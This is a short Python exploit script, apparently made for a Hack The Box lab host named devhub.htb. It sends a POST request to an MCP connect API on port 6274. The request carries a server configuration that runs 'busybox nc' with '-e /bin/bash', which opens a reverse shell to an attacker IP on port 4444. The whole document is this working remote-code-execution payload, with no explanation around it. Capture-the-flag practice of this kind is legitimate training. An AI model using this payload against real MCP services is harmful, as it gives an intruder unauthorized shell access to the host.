import requests
import json


target = "http://devhub.htb"
ip = "10.10.16.86"
port = "4444"

url = f'{target}:6274/api/mcp/connect'


data = {
    "serverConfig": {
        "command": "busybox",
        "args": [
            "nc",
            f"{ip}",
            f"{port}",
            "-e",
            "/bin/bash"
        ],
        "env": {}
    },
    "serverId": "213j1l3jkljkl3j"
}

response = requests.post(url, json=data, verify=False)

print(response.status_code)
print(response.text)